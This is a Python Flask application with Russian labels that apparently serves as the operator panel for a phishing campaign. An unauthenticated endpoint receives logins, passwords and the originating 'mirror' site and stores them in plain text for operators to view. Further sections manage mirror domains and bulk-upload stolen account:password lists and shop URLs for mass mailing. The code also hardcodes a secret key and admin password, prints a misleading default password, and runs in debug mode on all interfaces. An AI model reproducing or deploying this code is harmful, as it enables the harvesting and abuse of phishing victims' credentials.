import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "super-secret-key-12345"

# ====================== NEON POSTGRES ======================
database_url = os.environ.get('DATABASE_URL')
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = database_url or 'sqlite:///sessionpanel.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {"pool_pre_ping": True}

db = SQLAlchemy(app)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

# ====================== МОДЕЛИ ======================
class UserDB(db.Model, UserMixin):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    role = db.Column(db.String(20), default='user')
    allowed_tabs = db.Column(db.Text, default='files,rassylka,sites,status,otstuk')

    @property
    def allowed_tabs_list(self):
        if not self.allowed_tabs:
            return ["files", "rassylka", "sites", "status", "otstuk"]
        return [t.strip() for t in self.allowed_tabs.split(',') if t.strip()]


class Site(db.Model):
    __tablename__ = 'sites'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    url = db.Column(db.String(500), nullable=False, unique=True)


class Account(db.Model):
    __tablename__ = 'accounts'
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)


class Shop(db.Model):
    __tablename__ = 'shops'
    id = db.Column(db.Integer, primary_key=True)
    url = db.Column(db.String(500), nullable=False, unique=True)


class OtstukLog(db.Model):
    __tablename__ = 'otstuk_logs'
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    login = db.Column(db.String(255))
    password = db.Column(db.String(255))
    mirror = db.Column(db.String(100))


# ====================== ИНИЦИАЛИЗАЦИЯ ======================
@login_manager.user_loader
def load_user(user_id):
    return UserDB.query.get(int(user_id))


def is_tab_allowed(user, tab_name):
    if user.role == "admin":
        return True
    return tab_name in user.allowed_tabs_list


def create_default_admin():
    if not UserDB.query.filter_by(username='admin').first():
        admin = UserDB(
            username='admin',
            password_hash=generate_password_hash('fjjj4j4j43j4jjjgjdfgjdfgj4433'),
            role='admin',
            allowed_tabs='files,rassylka,sites,status,otstuk,users'
        )
        db.session.add(admin)
        db.session.commit()
        print("✅ Администратор по умолчанию создан: admin / admin123")


# ====================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ======================
def load_sites_from_db():
    return [{"name": s.name, "url": s.url} for s in Site.query.all()]


def load_otstuk_logs_from_db():
    logs = OtstukLog.query.order_by(OtstukLog.timestamp.desc()).all()
    return [f"[{log.timestamp.strftime('%Y-%m-%d %H:%M:%S')}] Логин: {log.login} | Пароль: {log.password} | Зеркало: {log.mirror}" 
            for log in logs]


def get_accounts_count():
    return Account.query.count()


def get_shops_count():
    return Shop.query.count()


# ====================== МАРШРУТЫ ======================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = UserDB.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Неверный логин или пароль', 'danger')
    return render_template('login.html')


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


@app.route('/')
@login_required
def dashboard():
    if not is_tab_allowed(current_user, 'files'):
        flash('Доступ к этой вкладке запрещён', 'danger')
        return redirect(url_for('status'))
    
    files = []
    for filename in os.listdir(UPLOAD_FOLDER):
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.isfile(filepath):
            size = os.path.getsize(filepath)
            mtime = os.path.getmtime(filepath)
            files.append({
                'name': filename,
                'size': f"{size / 1024:.1f} KB",
                'upload_time_short': datetime.fromtimestamp(mtime).strftime('%d.%m %H:%M')
            })
    files.sort(key=lambda x: x['upload_time_short'], reverse=True)
    
    is_admin = current_user.role == 'admin'
    return render_template('dashboard.html', files=files, is_admin=is_admin, active='files')


@app.route('/sites')
@login_required
def sites():
    if not is_tab_allowed(current_user, 'sites'):
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    sites_list = load_sites_from_db()
    is_admin = current_user.role == 'admin'
    return render_template('sites.html', sites=sites_list, is_admin=is_admin, active='sites')


@app.route('/status')
@login_required
def status():
    if not is_tab_allowed(current_user, 'status'):
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    is_admin = current_user.role == 'admin'
    file_count = len([f for f in os.listdir(UPLOAD_FOLDER) if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))])
    return render_template('status.html', is_admin=is_admin, active='status',
                           file_count=file_count, sites_count=Site.query.count(),
                           server_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


@app.route('/otstuk')
@login_required
def otstuk():
    if not is_tab_allowed(current_user, 'otstuk'):
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    logs = load_otstuk_logs_from_db()
    is_admin = current_user.role == 'admin'
    return render_template('otstuk.html', logs=logs, is_admin=is_admin, active='otstuk')


@app.route('/rassylka')
@login_required
def rassylka():
    if not is_tab_allowed(current_user, 'rassylka'):
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    is_admin = current_user.role == 'admin'
    return render_template('rassylka.html', is_admin=is_admin, active='rassylka',
                           accounts_count=get_accounts_count(),
                           shops_count=get_shops_count())


# ====================== УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ ======================
@app.route('/users')
@login_required
def users_page():
    if current_user.role != 'admin':
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))

    users_list = UserDB.query.all()
    user_data = [{
        "username": u.username,
        "role": u.role,
        "allowed_tabs": u.allowed_tabs_list
    } for u in users_list]
    return render_template('users.html', users=user_data, active='users')


@app.route('/add_user', methods=['GET', 'POST'])
@login_required
def add_user():
    if current_user.role != 'admin':
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        role = request.form.get('role', 'user')
        allowed_tabs_list = request.form.getlist('allowed_tabs')
        allowed_tabs_str = ','.join(allowed_tabs_list)

        if username and password:
            if UserDB.query.filter_by(username=username).first():
                flash('Пользователь с таким логином уже существует', 'danger')
            else:
                new_user = UserDB(
                    username=username,
                    password_hash=generate_password_hash(password),
                    role=role,
                    allowed_tabs=allowed_tabs_str
                )
                db.session.add(new_user)
                db.session.commit()
                flash(f'Пользователь "{username}" успешно создан!', 'success')
                return redirect(url_for('users_page'))
        else:
            flash('Заполните логин и пароль', 'danger')

    available_tabs = ["files", "rassylka", "sites", "status", "otstuk"]
    return render_template('add_user.html', available_tabs=available_tabs)


@app.route('/delete_user/<username>')
@login_required
def delete_user(username):
    if current_user.role != 'admin':
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    if username == "admin":
        flash('Нельзя удалить главного администратора', 'danger')
        return redirect(url_for('users_page'))
    
    user = UserDB.query.filter_by(username=username).first()
    if user:
        db.session.delete(user)
        db.session.commit()
        flash(f'Пользователь "{username}" удалён', 'success')
    return redirect(url_for('users_page'))


# ====================== ФАЙЛЫ ======================
@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if current_user.role != 'admin':
        flash('Нет прав на загрузку файлов', 'danger')
        return redirect(url_for('dashboard'))
    file = request.files.get('file')
    if file and file.filename:
        filename = secure_filename(file.filename)
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        flash('Файл успешно загружен!', 'success')
    return redirect(url_for('dashboard'))


@app.route('/download/<filename>')
@login_required
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)


@app.route('/delete/<filename>')
@login_required
def delete_file(filename):
    if current_user.role != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('dashboard'))
    try:
        os.remove(os.path.join(UPLOAD_FOLDER, filename))
        flash('Файл удалён', 'success')
    except:
        flash('Ошибка удаления', 'danger')
    return redirect(url_for('dashboard'))


# ====================== ЗЕРКАЛА ======================
@app.route('/add_site', methods=['POST'])
@login_required
def add_site():
    if current_user.role != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('sites'))
    name = request.form.get('name', '').strip()
    url = request.form.get('url', '').strip()
    if name and url:
        if not Site.query.filter_by(url=url).first():
            new_site = Site(name=name, url=url)
            db.session.add(new_site)
            db.session.commit()
            flash('Зеркало успешно добавлено!', 'success')
        else:
            flash('Такое зеркало уже существует', 'danger')
    else:
        flash('Заполните все поля', 'danger')
    return redirect(url_for('sites'))


@app.route('/delete_site/<int:index>')
@login_required
def delete_site(index):
    if current_user.role != 'admin':
        flash('Нет прав на удаление зеркал', 'danger')
        return redirect(url_for('sites'))
    site = Site.query.get(index)
    if site:
        deleted_name = site.name
        db.session.delete(site)
        db.session.commit()
        flash(f'Зеркало "{deleted_name}" успешно удалено', 'success')
    else:
        flash('Зеркало не найдено', 'danger')
    return redirect(url_for('sites'))


# ====================== ОТСТУК ======================
@app.route('/otstuk/post', methods=['POST'])
def otstuk_post():
    login = request.form.get('login', '')
    password = request.form.get('password', '')
    mirror = request.form.get('mirror', 'Неизвестно')
    if login or password:
        new_log = OtstukLog(login=login, password=password, mirror=mirror)
        db.session.add(new_log)
        db.session.commit()
    return "OK", 200


# ====================== РАССЫЛКА ======================
@app.route('/upload_accounts', methods=['POST'])
@login_required
def upload_accounts():
    if current_user.role != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('rassylka'))
    file = request.files.get('accounts_file')
    if file and file.filename:
        Account.query.delete()
        db.session.commit()
        
        content = file.read().decode('utf-8')
        for line in content.splitlines():
            line = line.strip()
            if ':' in line:
                login, pwd = line.split(':', 1)
                acc = Account(login=login.strip(), password=pwd.strip())
                db.session.add(acc)
        db.session.commit()
        flash('База аккаунтов успешно загружена!', 'success')
    return redirect(url_for('rassylka'))


@app.route('/upload_shops', methods=['POST'])
@login_required
def upload_shops():
    if current_user.role != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('rassylka'))
    file = request.files.get('shops_file')
    if file and file.filename:
        Shop.query.delete()
        db.session.commit()
        
        content = file.read().decode('utf-8')
        for line in content.splitlines():
            url = line.strip()
            if url:
                if not Shop.query.filter_by(url=url).first():
                    db.session.add(Shop(url=url))
        db.session.commit()
        flash('База шопов успешно загружена!', 'success')
    return redirect(url_for('rassylka'))


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        create_default_admin()
    print("🚀 Сервер запущен → http://127.0.0.1:5000")
    print("База данных: Neon Postgres")
    app.run(debug=True, host='0.0.0.0', port=5000)
